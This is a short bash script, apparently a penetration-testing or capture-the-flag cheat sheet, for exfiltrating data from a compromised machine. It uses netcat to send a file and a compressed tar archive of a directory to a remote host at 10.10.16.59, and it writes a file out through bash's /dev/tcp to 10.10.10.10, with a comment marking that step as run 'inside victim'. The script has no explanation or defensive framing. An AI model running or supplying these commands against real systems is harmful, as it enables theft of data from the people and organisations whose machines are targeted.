#!/bin/bash

# wait 3s just in case
nc -w 3 10.10.16.59 1234 < out.file
tar cfp - /some/dir | compress -c | nc -w 3 10.10.16.59 1234

# bash opens the tcp sockets automatically
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
